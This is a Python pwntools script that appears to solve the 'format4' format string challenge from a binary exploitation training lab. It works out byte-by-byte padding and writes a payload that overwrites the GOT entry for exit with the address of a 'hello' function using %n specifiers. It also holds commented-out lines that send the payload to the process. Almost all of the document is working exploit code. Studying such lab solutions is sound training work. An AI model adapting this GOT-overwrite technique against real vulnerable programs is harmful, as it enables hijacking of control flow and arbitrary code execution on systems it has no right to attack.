#!/usr/bin/env python
from pwn import *
import sys

# This script is unnecessarily long, the solution for this challenge
# could be shorter. The reason it is so long is because it takes into
# account the fact that the address for the 'hello' function could change

# Helper function to extract one byte from an integer
# ex. extract_byte(0xaabbccdd, 0) => 0xdd
# ex. extract_byte(0xaabbccdd, 2) => 0xbb
def extract_byte(value, pos):
	return (value >> (pos * 8)) % 256

def get_byte_padding(current, wanted):
	# Fuction is supposed to only give paddings for one byte
	wanted %= 256
	current %= 256

	# Printing a hex value with less than 8 padding can
	# print variable number of digits. We need to be sure
	# how many digits we print
	if wanted - 8 >= current:
		return wanted - current
	else:
		return wanted + 256 - current

e = ELF('./format4', checksec=False)
 
target_addr = int(e.symbols['got.exit'])
hello_addr = int(e.symbols['hello'])

# Position on the stack where the arguments will be
pos = 4

payload = p32(target_addr) + p32(target_addr + 1) + p32(target_addr + 2) + p32(target_addr + 3)

bytes_printed = len(payload) + 1
next_padding = get_byte_padding(bytes_printed, extract_byte(hello_addr, 0))
bytes_printed += next_padding + 1
payload += "%" + str(next_padding) + "x %" + str(pos)+ "$n"

next_padding = get_byte_padding(bytes_printed, extract_byte(hello_addr, 1))
bytes_printed += next_padding + 1
payload += "%" + str(next_padding) + "x %" + str(pos + 1)+ "$n"

next_padding = get_byte_padding(bytes_printed, extract_byte(hello_addr, 2))
bytes_printed += next_padding + 1
payload += "%" + str(next_padding) + "x %" + str(pos + 2)+ "$n"

next_padding = get_byte_padding(bytes_printed, extract_byte(hello_addr, 3))
payload += "%" + str(next_padding) + "x %" + str(pos + 3)+ "$n"

print(payload)

# Uncomment to send payload from script
# p = process("./format4")
# p.sendline(payload)
# print(p.read())
# p.close()

